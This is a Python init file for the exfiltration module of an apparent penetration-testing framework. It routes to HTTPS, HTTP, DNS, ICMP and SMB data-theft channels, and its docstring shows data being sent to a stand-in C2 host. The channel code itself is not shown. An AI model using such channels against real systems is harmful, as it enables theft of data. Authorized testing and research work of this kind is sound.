#!/usr/bin/env python3
"""
数据外泄模块 - Exfiltration Module
ATT&CK Tactic: TA0010 - Exfiltration

提供多种数据外泄通道，包括：
- HTTPS: 加密 HTTP 通道
- DNS: DNS 隧道
- ICMP: ICMP 隧道
- SMB: SMB 通道

仅用于授权渗透测试和安全研究
"""

from .base import (
    ExfilChannel,
    ExfilStatus,
    ExfilConfig,
    ExfilResult,
    BaseExfiltration,
)


class ExfilFactory:
    """
    外泄模块工厂

    根据配置创建对应的外泄模块实例

    Usage:
        config = ExfilConfig(channel=ExfilChannel.HTTPS, destination="https://c2.example.com")
        module = ExfilFactory.create(config)
        result = module.exfiltrate(data)
    """

    @staticmethod
    def create(config: ExfilConfig) -> BaseExfiltration:
        """
        创建外泄模块实例

        Args:
            config: 外泄配置

        Returns:
            BaseExfiltration 子类实例
        """
        if config.channel == ExfilChannel.HTTPS:
            from .channels.http import HTTPSExfiltration
            return HTTPSExfiltration(config)

        elif config.channel == ExfilChannel.HTTP:
            from .channels.http import HTTPExfiltration
            return HTTPExfiltration(config)

        elif config.channel == ExfilChannel.DNS:
            from .channels.dns import DNSExfiltration
            return DNSExfiltration(config)

        elif config.channel == ExfilChannel.ICMP:
            from .channels.icmp import ICMPExfiltration
            return ICMPExfiltration(config)

        elif config.channel == ExfilChannel.SMB:
            from .channels.smb import SMBExfiltration
            return SMBExfiltration(config)

        else:
            raise ValueError(f"Unsupported exfiltration channel: {config.channel}")


__all__ = [
    # 枚举
    'ExfilChannel',
    'ExfilStatus',

    # 数据类
    'ExfilConfig',
    'ExfilResult',

    # 基类
    'BaseExfiltration',

    # 工厂
    'ExfilFactory',
]
